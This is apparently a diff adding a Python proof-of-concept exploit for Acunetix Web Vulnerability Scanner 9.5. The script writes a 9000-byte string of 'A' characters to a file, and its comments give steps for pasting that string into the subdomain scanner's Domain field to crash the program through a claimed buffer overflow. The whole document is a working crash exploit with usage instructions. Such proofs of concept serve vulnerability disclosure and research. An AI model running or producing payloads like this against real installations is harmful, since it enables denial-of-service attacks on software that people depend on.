@@ -1,0 +1,21 @@
+#!/usr/bin/env python
+# Title : Acunetix Web Vulnerability Scanner 9.5 - Crash Proof Of Concept
+# Website : https://www.acunetix.com
+# Tested : win 7 / win 8.1 / win vista
+#
+#
+# Author      :   Hadi Zomorodi Monavar
+# Email       :   zomorodihadi@gmail.com
+#
+# 1 . run python code : python poc.py
+# 2 . open hadi.txt and copy content to clipboard
+# 3 . open "Acunetix Web Vulnerability Scanner 9.5"
+# 4 . from Tools Explorer --> subdomain scanner
+# 5 . Paste ClipBoard on "Domain"
+# 6 . Click start
+# 7 . Crashed ;)
+
+crash = "\x41"*9000 #B0F
+file = open("hadi.txt", "w")
+file.write(crash)
+file.close()
